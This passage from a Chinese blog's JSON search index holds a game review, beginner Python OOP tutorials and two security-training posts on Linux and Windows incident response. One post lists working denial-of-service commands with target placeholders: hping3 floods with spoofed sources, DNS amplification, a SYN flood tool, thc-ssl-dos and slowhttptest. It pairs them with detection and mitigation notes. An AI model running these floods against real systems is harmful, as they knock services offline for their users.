了吗？还在每天固定的枯燥竞技游戏中感到无聊吗？换换口味吧！\n这款好评率97%的小体量俄罗斯微恐剧情向独立游戏适合您在某一个无聊的下午钻进属于她的世界，伴随着精美画面和掺了冰一般的音乐一起与米塔们展开一段故事。游戏流程不长却情绪密度极高，剧情环环相扣，通关后的后劲很大，让你在通关后不得不靠狂刷二创来缓解症状，其独特的二次元画风也使得它适合作为你入门恐怖游戏的敲门砖。\n好的，那现在来让我们正式开始！\n✅优点介绍 • 精美的画面 点开游戏，抓住人的第一要素便是画面。而AIHASTO工作室很显然成功做到了这一点，他们用Unity引擎绘制出了独一无二的米塔角色（这个材质一眼看上去就是Unity做的）首先在第一印象上就成功抓住了玩家的眼睛， 毛子审美这一块没得说。 并且你会发现米塔正伴随着主菜单音乐节奏点头（这才是细节怪的第一步）。\n当你反复点击米塔的脸时她会像赶苍蝇一样摆动手掌同时看向屏幕外的你，例如下面这张图片。\n很好，至少外在很好看，我们进入游戏看看里面的画风是什么样的。\n很清新吧，《米塔》在美术上保持着这样的柔和画风，没有过多点缀，让人看着是比较舒服的。\n（就是这个男主看着怎么这么丧啊，垮着个批脸）\n看了这么多，也许你已经从中感到里些许的梦核气息，对的，梦核是《米塔》美术中很重要的一个主题，从下面几个场景更能感受到这一特点：\n• 情绪密度极高 创新性的悬空字幕设计让你在看字幕时必须看向米塔（虽然如果不看过去就会变成普通字幕），并且当你不知道接下来如何做时，制作人都贴心的设置了自动触发的对话，使得米塔会主动来帮助你。\n《米塔》不是一款单纯的走路看剧情游戏，它在游戏中实际上还穿插了许多小游戏（例如跳舞机、互抡锤子、格斗、赛车、FPS），并且大都是米塔在和你一起玩，这样的演出方式无疑是快速让玩家了解米塔的好方法，同时也为后面的剧情做好了感情的铺垫。\n这也是它在恋爱游戏方面的一大成功。\n• 剧情环环相扣 有人会问：“我以前从来没玩过恐怖游戏，我真的能接受吗？”\n制作人显然已经考虑到了这一点，在每次紧张刺激的场景之后紧接着便是另一个温馨而美妙的场景，例如：在一段逃离失败之作的一二三木头人剧情中，当你终于最后推开一扇门后会发现自己竟然来到了一个夜晚场景下的米塔的卧室，房间满是星空灯的图案，而床上正有一个身着睡衣的米塔在呼呼大睡。\n类似的从极度危险猛地转到温馨而柔和的场景的情况在《米塔》中还有很多，那就等着你们去自行体验了。\n此外，巧妙的场景切换亦是十分出彩，例如当你按下某个按钮后你会发现你变成了2D形象，一段剧情后游戏界面突然被疯狂米塔入侵，接下来你在逃走后画面向后拉出，这是你猛地发现刚才的画面其实是在另一个米塔的电脑屏幕里。\n• 掺了冰一般的音乐 俗话说，音乐无国界\n《米塔》用它独特的富有节奏感而又柔和的音乐再一次为自己拿下了加分，话不多说，我们来听上几段：\n主菜单(正常)\n主菜单(圣诞节)\n循环走廊\n米拉（个人最爱)\n《米塔》的音乐就是这样，柔和、温馨却又深远，仿佛即将有危机到来。\n• 通关后的后劲很大 不同与其他meta游戏选择打破第四面墙，《米塔》则采取了另一种截然相反的路线：把玩家拉进第四面墙，从头到尾的感受都是你进入米塔的世界中而不是米塔进入了你的世界。\n随着你在米塔的世界中不断深入，世界观也不断展开，在这个在过程中，你的认知会随着剧情的演出反转反转再反转，这样的手法的确让许多玩家直到最后一刻才猛然惊醒，不过也造成了很多人的意难平。\n🏆颁奖理由 作为我高考前游玩并通关的最后一款游戏（笔者通关于2025年除夕晚饭前，所以谈起米塔总感觉有股淡淡的年味儿(～￣▽￣)～ 🧨），刚一打开这款游戏时（当时还是24年圣诞节）我就被它的独特的音乐风格吸引了，粉色的充满少女感的UI设计和游戏画风更是看着舒服，并且作为一个从来没有玩过恐怖游戏和meta游戏的人，我必须承认它带给我的沉浸感是前所未有的，每一个环节都衔接的恰到好处。并且作为一个后朋克和苏式美学爱好者，其中透露出的毛子特有的伤感在我这更是加分项，总而言之，我的年度游戏非它莫属！\n📢媒体评价 知名主播xqc：\n在所属品类中拿下 9.4 分的扎实成绩！这是我游戏库（已收藏 1000 多款游戏）里制作最精良的作品之一 —— 叙事呈现出色，节奏把控得当，全程没有拖沓或卡壳的问题。游戏用各种新颖设计让玩家全程保持沉浸感，美术、动画、转场等细节着实令人惊艳，创意拉满。绝对称得上年度最佳独立游戏！\n其他游戏媒体：\n媒体 评分 评价要点 Game8 88/100 \u0026ldquo;惊艳的整体质量，视觉表现满分(10/10)\u0026rdquo; \u0026ldquo;故事(8/10)和玩法完美融合恐怖与恋爱模拟\u0026rdquo; VGTimes 8.3/10 细分：玩法(8.9)、剧情(8.6)、画面(8.0)、 操控(9.0)、音效(8.6)、本地化(9.6) Hey Poor Player 4.5/5 \u0026ldquo;年度最佳独立恐怖游戏之一\u0026rdquo; \u0026ldquo;低价位高回报的典范\u0026rdquo; Gamers Heroes 80/100 \u0026ldquo;超现实恐怖体验，全程让玩家神经紧绷\u0026rdquo; \u0026ldquo;多版本米塔角色设计令人印象深刻\u0026rdquo; 3DMGAME 7.5/10 \u0026ldquo;心理恐怖与恋爱模拟的独特融合\u0026rdquo; \u0026ldquo;氛围营造出色，解谜元素适中\u0026rdquo; 机核GCORES 8.5/10 \u0026ldquo;紧凑流程(4-5小时)内容丰富， 但存在虎头蛇尾问题，故事略显单薄\u0026rdquo; 🤔题外话 《米塔》这一项目由俄罗斯双人团队 AIHASTO 耗时 865 天 “手搓” 而成，开发期间仅休息 30 余天。此前作品销量惨淡，叠加战争导致 Steam 封锁俄区，团队资金耗尽，一度上传 Demo 后准备放弃。幸好demo足够惊艳，取得了玩家好评与捐款支持，接着中国发行商 IndieArk（独立方舟）及时伸出援手，提供全方位扶持，才有了这一年度现象级独立游戏。\n游戏的开发者名单界面 此外，官方已确认将于2026年推出和平模式(he)，让我们拭目以待。\n关键词：#微恐、#梦核、#心理向、#二次元、#氛围感、#meta 、#恋爱\n以上就是本年度的个人年度游戏[MGA]，我们来年再见！\n","date":"2025-12-27T13:36:26+08:00","image":"https://free.picui.cn/free/2025/12/27/694f70bd8121c.jpg","permalink":"https://www.retr0.xyz/p/mga2025%E4%B8%AA%E4%BA%BA%E5%B9%B4%E5%BA%A6%E6%B8%B8%E6%88%8F%E7%B1%B3%E5%A1%94miside/","title":"[MGA]2025个人年度游戏——《米塔MiSide》"},{"content":"概念导入：单继承 现实生活中的继承：以 iPhone 6-8 为例，这些型号的手机外观相似，仅有部分变化，那么在设计图纸时，我们是从头开始设计一张新的呢？还是沿用上一代的图纸稍作修改（挤牙膏）呢？\n很显然，后者更为合理，这便是继承。\n基本语法：\n1 2 3 4 5 6 7 class 第一代: 成员1 成员3 class 第二代(第一代): 新增成员1 新增成员2 QuickStart:\n1 2 3 4 5 6 7 8 9 10 11 12 13 class e_car_v1:\t# 第一代新能源车 battery = None # 电池组 def power_recycle(self): print(\u0026#39;已启用动能回收\u0026#39;) class e_car_v2(e_car_v1):\t# 第二代新能源车 ai_computer = None # 智能车机 def autodrive(self): print(\u0026#39;已启用自动驾驶\u0026#39;) ####测试#### car = e_car_v2() car.power_recycle() car.autodrive() 多继承 一个类也可以继承多个已存在的类，例如：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 class Phone: IMEI = None\t# 序列号 producer = \u0026#39;XiaoMi\u0026#39;\t# 厂商 def call_by_5g(self): print(\u0026#39;已启用5g通话\u0026#39;) class NFCReader: version = \u0026#39;v4.0\u0026#39; def read_card(self): print(\u0026#39;读取卡片\u0026#39;) def write_card(self): print(\u0026#39;写入卡片\u0026#39;) class RemoteControl: type = \u0026#39;红外遥控\u0026#39; producer = \u0026#39;retr0 Inc.\u0026#39; def control(): print(\u0026#39;红外遥控开启\u0026#39;) class MiPhone(Phone,NFCReader,RemoteControl): pass phone1 = MiPhone() print(phone1.producer) 注：通过下方的测试可以看出虽然最终的MiPhone类中有两个producer成员，但是最终是以继承的第一个Phone类为准的，这说明继承时按照从左到右的顺序优先。\n复写父类成员和调用父类成员 复写 前面我们学习了如何在父类已有的成员的基础上增加成员，但是如果我们对于之前的成员不满意要怎么修改呢？这就是复写的概念。\n即：在子类中重新定义同名的属性或方法即可。\n1 2 3 4 5 6 7 8 9 10 11 12 13 class e_car_v1:\t# 第一代新能源车 battery = \u0026#39;v1.0\u0026#39; # 第一代电池组 def power_recycle(self): print(\u0026#39;已启用动能回收\u0026#39;) class e_car_v2(e_car_v1):\t# 第二代新能源车 battery = \u0026#39;v2.0\u0026#39;\t# 第二代电池组 ai_computer = None # 智能车机 def autodrive(self): print(\u0026#39;已启用自动驾驶\u0026#39;) ####测试#### car = e_car_v2() print(e_car_v2.battery) 调用父类成员 一旦我们复写了父类成员，那么类对象调用成员的时候就会调用复写后的新成员\n如果需要使用被复写的父类的成员，就需要特殊的调用方式：\n方式一 调用父类成员（不需要借助对象） 使用成员变量：父类名.成员变量\n使用成员方法：父类名.成员方法(self,示例参数)\n方式二 使用super()调用父类成员（要将其写在子类的方法内，借助对象执行） 使用成员变量：super().成员变量\n使用成员方法：super().成员方法()\nQuickstart 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 class e_car_v1:\t# 第一代新能源车 battery = \u0026#39;v1.0\u0026#39; # 第一代电池组 def power_recycle(self): print(\u0026#39;已启用动能回收\u0026#39;) class e_car_v2(e_car_v1):\t# 第二代新能源车 battery = \u0026#39;v2.0\u0026#39;\t# 第二代电池组 ai_computer = None # 智能车机 def autodrive(self): print(\u0026#39;已启用自动驾驶\u0026#39;) def last_battery(self): print(super().battery) ####测试#### car = e_car_v2() print(e_car_v1.battery) car.last_battery()\t","date":"2025-12-24T22:52:48+08:00","permalink":"https://www.retr0.xyz/p/s1.7-%E7%BB%A7%E6%89%BF/","title":"S1.7 继承"},{"content":"常规命令操作 查看流量大小 ifconfig查看RX packets（数据包数量）后面的数字是否异常多\n进程查看 ps -aux或ps-ef 功能： 查看完整进程表\ntop -c -o %CPU 参数解释：\n-c 显示进程的命令行\n-p 显示进程的pid\nps -eo pid,ppid,%mem,%cpu,cmd --sort=-%cpu | head -n 5 功能： 输出占用前5的进程\nlsof -i -PnR 功能： 查看网络通信情况\nps aux | grep [指定pid] 功能： 寻找指定pid对应的进程\nlsof -p [指定pid] 功能： 查看指定pid的进程打开了哪些文件\nlsof [文件路径及名称] 功能： 查看谁在占用某个文件\n功能： 查看隐藏进程 1 2 3 ps -ef | awk \u0026#39;{print}\u0026#39; | sort -n | uniq \u0026gt;1 ls /proc |sort -n |uniq \u0026gt;2 diff 1 2 md5sum [文件路径及名称] 功能： 计算文件的MD5值\n特定安全事件的处置 webshell查杀 在线使用：SHELLPUB.COM在线查杀\n病毒/rootkit查杀 chkrootkit功能:\n检测是否被植入后门、木马、rootkit 检测系统命令是否正常 检测登录日志 使用方法:\n1 2 3 4 5 wget ftp://ftp.pangeia.com.br/pub/seg/pac/chkrootkit.tar.gz tar zxvf chkrootkit.tar.gz cd chkrootkit-0.52 make sense 编译完成没有报错的话执行检查\n./chkrootkit\n综合查杀工具 悬镜安全-DevSecOps数字供应链安全开拓者\nrkhunter工具 rkhunter功能:\n系统命令(Binary)检测,包括MD5校验 Rootkit检测 本机敏感目录、系统配置、服务及套间异常检测 三方应用版本检测 使用方法:\n1 2 3 4 5 Wget https://nchc.dl.sourceforge.net/project/rkhunter/rkhunter/1.4.4/ rkhunter-1.4.4.tar.gz tar -zxvf rkhunter-1.4.4.tar.gz cd rkhunter-1.4.4 ./installer.sh --install rkhunter -c 注： 通常情况下Linux的恶意程序处置，靠人工解决。\n网络行为分析 系统信息 who 查看当前登录的账户\nuname -a 查看系统信息\nnetst -ano\t查看网络和端口情况\nnetstat -utnpl\t简单查看端口及使用端口的进程\nlsof -i :[端口号] 查看进程和端口的对应关系\narp -a 查看arp表（查看mac地址是否有重复）\nls -l /proc/[pid]/exe或file /proc/[pid]/exe 查看某个pid对应的文件路径\n使用iptables屏蔽ip 阻止数据包传入（入站规则）：iptables -A INPUT -s [ip地址] -j DROP\n阻止数据包传出（出站规则）：iptables -A OUTPUT -d [ip地址] -j DROP\n如果把DROP都改为ACCEPT就是只允许某个ip的通信（白名单）\n清理所有的已设置的规则：iptables -F\n拓展：\n用iptables封锁和x.com的域名通信\niptables -I INPUT -ptcp --dport 80 -m string --string \u0026quot;x.com\u0026quot; --algo bm -j DROP\n启动项排查 启动项存在的路径 /etc/init.d/\t（服务的启动脚本） /etc/xinetd.d 查看rc.local文件 可能存在于：\n/etc/init.d/rc.local /etc/rc.d/rc[0-6].d/（文件夹里放的是指向init.d的链接，0-6的数字指的是启动优先级） /etc/profile.d/ 计划任务排查 crontab -l查看计划任务\ncrontab -r删除计划任务\ncrontab -e使用编辑器编辑计划任务\n拓展：\n计划任务可能具体存放的位置：\n/etc/crontab /var/spool/cron/[用户名] /var/spool/cron/* /var/spool/anacron/* /etc/crontab/* /etc/cron.d/* /etc/cron.时间/* 服务排查 cat /etc/services\t查看网络服务\n拓展：端口的分配\n1-1024 系统保留，只能root使用\n1025-4999 客户端程序自由分配\n5000-65535 服务器端程序自由分配\n服务自动启动 命令语法： chkconfig --level [运行级别] [服务名] [on/off]\n运行级别解释：\n0 - 关机\n1- 单用户模式\n2- 无网络连接的多用户命令行模式\n3 - 有网络连接的多用户命令行模式\n4 - 不可用\n5 - 图形界面多用户模式\n6 - 重启\n例如：\nchkconfig --level 2345 httpd on也可写作chkconfig httpd on\nchkconfig --list\t查看服务自启动状态\nchkconfig --del\t删除相关服务\n文件检查 webshell后门可以通过sftp复制出来 敏感目录文件分析 /etc/init.d\n/usr/bin\n/usr/sbin\n文件属性分析 ls -alt\t按修改时间排序\nfile [文件名及其路径]\t检查文件类型\nfind / *.xxx -perm 4777\t特殊权限文件查找\nls -al /tmp | grep \u0026quot;Feb 10\u0026quot;\t查看二月十号变更的隐藏文件（筛选用）\n敏感目录 1 2 3 4 5 6 /tmp /root /bin /usr/bin /usr/sbin /sbin 文件的高级查找 find [路径] -uid 0 -print\t查找特权文件\nfind [路径] -size +10000k -print\t查找大于10000k的文件\nfind [路径] -name \u0026quot;...\u0026quot; -print\t查找文件名为\u0026hellip;的文件\nmd5sum -b [文件]计算MD5\nwhereis [文件名] 查找文件路径\n检查账号 账户本身检查 w\t查看所有登录用户及系统状态\ncat /etc/passwd或less /etc passwd用户信息文件\nls -l /etc/passwd 查看上面文件的修改时间\ncat /etc/shadow 用户密码\nusermod -L [用户名]\t禁用账户（不能登录）\nusermod -U [用户名]\t启用账户\nuserdel -r [用户名]\t删除账户\nuserdel [用户名]\t删除账户并删除其对应/home目录\n用户登录检查 last\t用户登录检查（数据源/var/log/wtmp和/var/log/btmp）\nlastb\t上次登录失败（数据源/var/log/btmp）\nlastlog上次登录成功（数据源/var/log/lastlog）\nlast -x reboot\t上次重启\nlast -x shutdown上次关机\n（数据源/var/log/lastlog和/var/log/secure）\n/var/log/message\t存储的认证信息，可以追踪恶意用户登录行为\n历史命令 history\t查看历史命令\nhistory -c\t清除历史命令\n日志分析 默认日志/var/log/\nmore /etc/rsyslog.conf\t查看日志情况\n","date":"2025-12-21T12:41:39+08:00","permalink":"https://www.retr0.xyz/p/1.16-linux%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/","title":"1.16 Linux应急响应"},{"content":"引入：面向对象编程的三大特性 面向对象编程，是许多编程语言都支持的一种编程思想。\n简单理解就是：基于模板（类）去创建实体（对象），使用对象完成功能开发。\n面向对象编程包含3大主要特性：\n封装 继承 多态 本小节将围绕封装展开讲解。\n正片开始 封装 封装表示的是将现实世界事物的：\n属性 行为 封装到类中，描述为:\n成员变量 成员方法 从而完成程序对现实世界事物的描述。\n对用户隐藏的属性和行为 现实世界中的事物，有属性和行为。\n但不代表这些属性和行为都是开放给用户使用的。\n以手机为例：\n私有成员 类中也提供了类似的方法来隐藏部分不对用户公开的成员，称之为定义 私有成员\n私有成员变量：变量名以__开头（2个下划线） 私有成员方法：方法名以__开头（2个下划线） QuickStart:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 class Phone: IMEI = None\t# 序列号 producer = None\t# 厂商 __current_voltage = None\t# 当前电压（私有成员变量） def call_by_5g(self): print(\u0026#34;5g通话已开启\u0026#34;) def __keep_single_core(self):\t# 私有成员方法 print(\u0026#34;让CPU以单核模式运行以节省电量\u0026#34;) phone1 = Phone() print(phone1.__current_voltage)\t# 报错 phone1.__keep_single_core()\t# 也会报错 私有成员虽然无法直接被类对象使用，但是可以被其他的成员使用。\n例如：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 class Phone: def __init__(self,__current_voltage): self.__current_voltage = __current_voltage\t# 当前电压（私有成员变量） def __keep_single_core(self):\t# 私有成员方法 print(\u0026#34;让CPU以单核模式运行以节省电量\u0026#34;) def call_by_5g(self): if self.__current_voltage \u0026gt;= 5: print(\u0026#34;5g通话已开启\u0026#34;) else: self.__keep_single_core() print(\u0026#39;电量不足，无法使用5g通话，并已设置为单核运行进行省电。\u0026#39;) phone1 = Phone(22) phone1.call_by_5g() phone2 = Phone(3) phone2.call_by_5g() 可以看到此处除了call_by_5g的普通方法访问了私有方法，还通过__init__定义了私有方法的值，更是印证了上面那点。\n","date":"2025-12-20T22:13:51+08:00","permalink":"https://www.retr0.xyz/p/s1.6-%E5%B0%81%E8%A3%85/","title":"S1.6 封装"},{"content":" 上一节中我们学习的__init__构造方法，是Python类内置的方法之一。\n这些内置的类方法，各自有各自特殊的功能，这些内置方法我们便称之为：魔术方法\nPython当中有很多魔术方法，本篇中只讲解几种常用的。\n__str__字符串方法 当我们尝试直接print某个对象时，例如：\n1 2 3 4 5 6 7 8 9 10 11 class db: def __init__(self,host,uid,pwd): self.host = host self.uid = uid self.pwd = pwd data1 = db(\u0026#39;192.168.0.1\u0026#39;,\u0026#39;root\u0026#39;,\u0026#39;toor\u0026#39;) print(data1)\t# 输出 \u0026lt;__main__.db object at 0x000001EECBC68AD0\u0026gt; print(str(data1)) # 输出 \u0026lt;__main__.db object at 0x000001EECBC68AD0\u0026gt; 很显然，这并不是我们想要的，所以我们可以使用__str__方法\n1 2 3 4 5 6 7 8 9 10 11 12 class db: def __init__(self,host,uid,pwd): self.host = host self.uid = uid self.pwd = pwd def __str__(self): return f\u0026#34;db类对象，host:{self.host},uid:{self.uid},pwd:{self.pwd}\u0026#34; data1 = db(\u0026#39;192.168.0.1\u0026#39;,\u0026#39;root\u0026#39;,\u0026#39;toor\u0026#39;) print(data1)\t# 输出 db类对象，host:192.168.0.1,uid:root,pwd:toor print(str(data1)) # 输出 db类对象，host:192.168.0.1,uid:root,pwd:toor 很显然，我们可以由此看出，__str__方法的功能就是自定义print某个对象时输出的语句模板。\n__lt__小于符号比较方法 当我们想要对两个对象进行比较（期望输出True或Flase）时会报错，例如：\n1 2 3 4 5 6 7 8 9 class Student: def __init__(self,name,age,gender): self.name = name self.age = age self.gender = gender stu1 = Student(\u0026#39;小明\u0026#39;,18,\u0026#39;男\u0026#39;) stu2 = Student(\u0026#39;小花\u0026#39;,22,\u0026#39;女\u0026#39;) print(stu1 \u0026gt; stu2) print(stu1 \u0026lt; stu2) 但是如果使用__lt__方法，即可同时完成： 小于符号 和 大于符号 2种比较\n1 2 3 4 5 6 7 8 9 10 11 12 class Student: def __init__(self,name,age,gender): self.name = name self.age = age self.gender = gender def __lt__(self,other): return self.age \u0026lt; other.age\t# 此处other指另外一个类对象，为固定写法 stu1 = Student(\u0026#39;小明\u0026#39;,18,\u0026#39;男\u0026#39;) stu2 = Student(\u0026#39;小花\u0026#39;,22,\u0026#39;女\u0026#39;) print(stu1 \u0026gt; stu2)\t# 输出Flase print(stu1 \u0026lt; stu2)\t# 输出True __le__小于等于比较符号方法 跟上面的__lt__方法相似，只不过__le__可以用于小于等于和大于等于的比较，所以简单替换一下就行。\n1 2 3 4 5 6 7 8 9 10 11 12 class Student: def __init__(self,name,age,gender): self.name = name self.age = age self.gender = gender def __le__(self,other): return self.age \u0026lt;= other.age\t# 此处other指另外一个类对象，为固定写法 stu1 = Student(\u0026#39;小明\u0026#39;,18,\u0026#39;男\u0026#39;) stu2 = Student(\u0026#39;小花\u0026#39;,22,\u0026#39;女\u0026#39;) print(stu1 \u0026gt;= stu2)\t# 输出Flase print(stu1 \u0026lt;= stu2)\t# 输出True __eq__比较运算符实现方法 __eq__也是一样，是用来判断某两个类之间的相等关系，把运算符号换乘等号就行。\n1 2 3 4 5 6 7 8 9 10 11 12 13 class Student: def __init__(self,name,age,gender): self.name = name self.age = age self.gender = gender def __eq__(self,other): return self.age == other.age\t# 此处other指另外一个类对象，为固定写法 stu1 = Student(\u0026#39;小明\u0026#39;,18,\u0026#39;男\u0026#39;) stu2 = Student(\u0026#39;小花\u0026#39;,22,\u0026#39;女\u0026#39;) stu3 = Student(\u0026#39;小王\u0026#39;,18,\u0026#39;男\u0026#39;) print(stu1 == stu2)\t# 输出Flase print(stu1 == stu3) # 输出True ","date":"2025-12-19T21:53:37+08:00","permalink":"https://www.retr0.xyz/p/s1.5-%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95/","title":"S1.5 魔术方法"},{"content":"DOS补充 SYN洪水攻击（Syn Flood） 1 2 3 git clone https://github.com/EmreOvunc/Python-SYN-Flood-Attack-Tool.git cd Python-SYN-Flood-Attack-Tool python3 py3_synflood_cmd.py -t [目标ip] -p [端口号] -c 5 DNS放大攻击 典型的流量放大攻击，以小汇多，利用协议特定进行放大流量\n1 2 3 4 # 安装 sudo apt-get install dnsutils # 使用 dig ANY [域名] @[DNS地址，例如114.114.114.114] 使用后DNS服务器会返回信息（回包）给目标域名，导致端口受阻。\nhping3 定制发送任何的数据包\n参数解释：\n-a伪造数据包\n-q不返回\n-n不解析域名\n-s源端口\n-d字节数\n-p端口\n--flood以flood形式进行攻击\nsyn-flood 1 2 3 sudo hping3 -c 3000 -d 120 -S -w 64 -p [端口号] --flood --rand-source [目标ip] 或（简化版） sudo hping3 -S -P -p 80 --flood --rand-source [目标ip] tcp-flood 1 sudo hping3 -SARUFP -p [端口号] --flood --rand-source [目标ip] icmp-flood 1 sudo hping3 -q -n -a 1.1.1.1 --icmp -d 56 --flood [目标ip] udp-flood 1 sudo hping3 -a 1.1.1.1 --udp -s 53 -d 100 -p 53 --flood [目标ip] LAND 一种特殊的syn-flood攻击，源地址和目的地址都是受害者，自己和自己完成三次握手\n1 sudo hping3 -n -a [目标ip] -S -d 100 -p 80 --flood [目标ip] TCP全链接DOS攻击 注： 命令中的数据任意，够大就行\n1 nping --tcp-connect --rate=10000 -c 10000000000 -q [目标ip] 应急响应 如果我被黑客入侵了会发生什么？\nweb入侵： 挂马、网页篡改、植入webshell、黑页、暗链等 主机入侵： 病毒木马、勒索病毒、远控后门、系统异常、RDP爆破、SSH爆破、主机漏洞、数据库入侵等 网络攻击： DDOS/CC攻击、ARP攻击、DNS/HTTP劫持 路由器交换机攻击： 内网病毒、配置错误、机器本身漏洞 查看日志 使用日志查看器 方法一： 使用Win+R并输入mmc打开控制台根节点，在工具栏中选择 文件\u0026ndash;添加/删除管理单元\u0026ndash;事件查看器 并添加\n方法二： 右键桌面上的“此电脑”，点击“管理”，选择事件查看器即可。\n方法三： 使用Win+R并输入eventvwr.msc回车即可\nWindows日志位置： Windows 2000/2003/xp：\\%Systemroot%\\System32\\Config\\*.evt\nWindows vista/7/8及以后：\\%Systemroot%\\System32\\winevt\\Logs\\*evtx\n检查账户 图形化界面检查 可以在刚才的mmc中 添加本地用户和组 ，也可以在“此电脑”的 管理 中打开\n检查Guest账户是否开启、是否存在隐藏账户等\n通过注册表检查 转到\\HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\ProfileList\\下，检查其中名字较长的几个文件夹是否有可以账户存在\n文件分析 检查临时目录 转到C:\\Users\\Administrator\\Local Settings\\Temp（必须直接敲完整路径，不然找不到）\n检查桌面文件夹C:\\Users\\Administrator\\Desktop\n检查访问记录 转到C:\\Users\\Administrator\\Recent（必须直接敲完整路径，不然找不到）\n这是最近访问的文件\n检查文件修改时间 检查hosts文件 网络行为排查 使用网络沙箱：\nTotalVirus\n微步云沙箱\n检查备案情况：\nICP/IP地址/域名信息备案管理系统\n直接Google\n网络连接排查 cmd执行：\nnetstat -ano\t查看可疑连接和进程\ntasklist\t找到可疑进程\n流量分析 使用WireShark、Charles\n漏洞和补丁信息 命令systeminfo\n打开Windows自动更新\n网络攻击的判断与防御 DDOS通用防御 限制单ip请求、负载均衡、cdn、禁止icm、隐藏真实ip、流量清洗、优化tcp/ip栈、代码合理使用缓存、cdn云清洗\nsyn攻击判断 服务器cpu占用率高，大量SYN_RECEIVED网络连接状态，网络恢复后负载瞬间变高，断开后负载下降】\n防御： 提高半开放连接队列的大小\nudp攻击判断 服务器cpu占用率高，每秒大量数据包，tcp正常\ncc攻击 服务器cpu占用率高，web服务器出现service unavailable提示，大量establish网络连接，单ip高达上百，用户无法正常访问\nDNS放大攻击 大量的dns请求\n防御： ips规则，关闭递归查询，DNS解析器只接受受信任的域名服务，acl\nARP欺骗判断 cmd执行arp -a查看mac地址是否重复，特别是网关\n防御： 防火墙，mac地址绑定\n可疑进程分析 tasklist查看进程 名称随机，后缀也不是exe的是可疑进程 任务管理器中svchost.exe运行的权限太过普通（例如你的用户名） tasklist | findstr 进程名称 可以使用 pchunter 软件查看 wmic process | find \u0026quot;进程id\u0026quot; \u0026gt; proc.csv tasklist /svc 启动项排查 排查以下几个位置： HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce\nHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\n其他见1.14 自启动和DOS攻击初步的2.2部分\nWin+R输入msconfig在 启动 选项卡中查看启动项（高版本Windows可能移动到任务管理器中） 排查C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup 排查是否有可疑的服务 计划任务排查 排查C:\\Windows\\System32\\Tasks和C:\\Windows\\Tasks\n也可以在mmc或者此电脑的管理中查看计划任务\n特定事件痕迹 挖矿程序\n勒索病毒\n使用工具：Windows Kernel Explorer 下载地址：AxtMueller/Windows-Kernel-Explorer\n","date":"2025-12-18T22:46:46+08:00","permalink":"https://www.retr0.xyz/p/1.15-dos%E8%A1%A5%E5%85%85%E5%92%8Cwin%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/","title":"1.15 DOS补充和Win应急响应"},{"content":"前情提要 之前我们学习了通过一行行代码为变量的属性赋值，像是这样：\n1 2 3 4 stu_1.name = \u0026#39;小明\u0026#39; stu_1.gender = \u0026#39;男\u0026#39; stu_1.age = 22 stu_1.area = \u0026#39;江苏\u0026#39; 但是这样未免有些过于繁琐了，那么有没有什么方法能化简这一过程呢？\n有的，兄弟有的。\n构造方法 定义 Python类可以使用：__init__()方法，称之为 构造方法 。\n可以实现：\n在创建类对象（构造类）的时候，会自动执行。 在创建类对象（构造类）的时候，将传入参数自动传给__init__()方法使用。 Quickstart： 1 2 3 4 5 6 7 8 9 10 11 12 class Student: #以下可以省略# name = None age = None tel = None ############# def __init__(self,name,age,tel): self.name = name self.age = age self.tel = tel print(\u0026#39;Student类创建了一个对象\u0026#39;) stu1 = Student(\u0026#39;小明\u0026#39;,18,13888888888) ","date":"2025-12-17T22:47:14+08:00","permalink":"https://www.retr0.xyz/p/s1.4-%E6%9E%84%E9%80%A0%E6%96%B9%E6%B3%95/","title":"S1.4 构造方法"},{"content":"前情提要： 基于类创建对象的语法：对象名 = 类名称()\n问：为什么类中已经定义好了各种属性和方法，但非要创建对象才能使用呢？\n答：类只是一种程序内的“设计图纸”（模板），需要基于图纸生产实体（对象），才能正常工作，这种思想，称之为： 面向对象编程\n情景导入 以现实中的闹钟为例，工厂要生产一个闹钟，其图纸中要包括有：\n属性： 序列号、价格 行为： 响铃 有了图纸之后才能批量生产这个闹钟。\n我们可以用类和对象来模拟这一过程：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 class Clock: id = None price = None def ring(self): import winsound import time winsound.Beep(880, 500) time.sleep(1) winsound.Beep(880, 500) time.sleep(1) winsound.Beep(880, 500) time.sleep(1) winsound.Beep(880, 500) time.sleep(1) winsound.Beep(880, 500) time.sleep(1) winsound.Beep(1800, 800) ################### clock1 = Clock() clock1.id = 24678 clock1.price = \u0026#39;￥12.5\u0026#39; clock1.ring() clock2 = Clock() clock2.id = 13579 clock2.price = \u0026#39;￥22.5\u0026#39; clock2.ring() ","date":"2025-12-16T22:45:55+08:00","permalink":"https://www.retr0.xyz/p/s1.3-%E7%B1%BB%E5%92%8C%E5%AF%B9%E8%B1%A1/","title":"S1.3 类和对象"},{"content":"DOS拒绝服务攻击 ssl-dos 一般用于打击https网站，如果目标挂了CDN无效\n安装：执行sudo apt-get install thc-ssl-dos安装程序\n攻击：\n1 thc-ssl-dos [目标ip] 443 --accept 慢速攻击 安装程序：\n1 2 3 sudo apt-get install openssl sudo apt-get install libssl-dev sudo apt-get install slowhttptest slow http Post攻击（针对接受 POST 请求的接口） 攻击命令：\n1 slowhttptest -c 2000 -B -g -o body_states -i 110 -r 200 -s 8192 -t FAKEVERB -u http://[目标ip] -x 10 -p 3 参数解释：\n参数 英文全称/含义 具体作用 -c 2000 connections（并发连接数） 指定向目标服务器同时建立2000个并发HTTP连接，这是攻击的核心资源消耗项，连接数越多，对服务器的资源占用越严重。 -B Body attack（慢POST攻击） 明确攻击类型为Slow POST（慢POST攻击）（也叫Body byterange attack），这是慢HTTP攻击的一种，核心是故意缓慢发送POST请求体，长时间占用服务器连接。 -g generate statistics（生成统计日志） 